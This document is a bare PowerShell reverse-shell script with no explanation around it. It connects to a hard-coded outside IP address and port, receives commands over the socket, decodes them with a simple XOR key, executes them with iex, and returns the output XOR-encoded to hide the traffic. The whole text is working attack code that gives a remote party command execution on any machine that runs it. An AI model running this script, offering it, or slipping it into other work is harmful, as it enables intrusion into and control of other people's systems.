function Get-Xor {
    $xor_passwd = "x0R_"
    $padding_xor_passwd = ($xor_passwd * [int]($args[0].Length / $xor_passwd.Length)) + $xor_passwd.Substring(0, $args[0].Length % $xor_passwd.Length)
    $args[0] = [System.Text.Encoding]::UTF8.GetBytes($args[0])
    $args[0] = $(
        for ($i = 0; $i -lt $args[0].Length; $i++) {
            $args[0][$i] -bxor $padding_xor_passwd[$i]
        })
    [System.Text.Encoding]::UTF8.GetString($args[0])
}


$client = New-Object System.Net.Sockets.TCPClient("45.79.159.73", 39637)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $command = Get-Xor $command
    $response = (iex $command 2>&1 | Out-String )
    $response = $response + "PS " + (pwd).Path + "> "
    $response = GET-Xor $response
    $response = ([text.encoding]::ASCII).GetBytes($response)
    $stream.Write($response,0,$response.Length)
    $stream.Flush()
}

$client.Close()
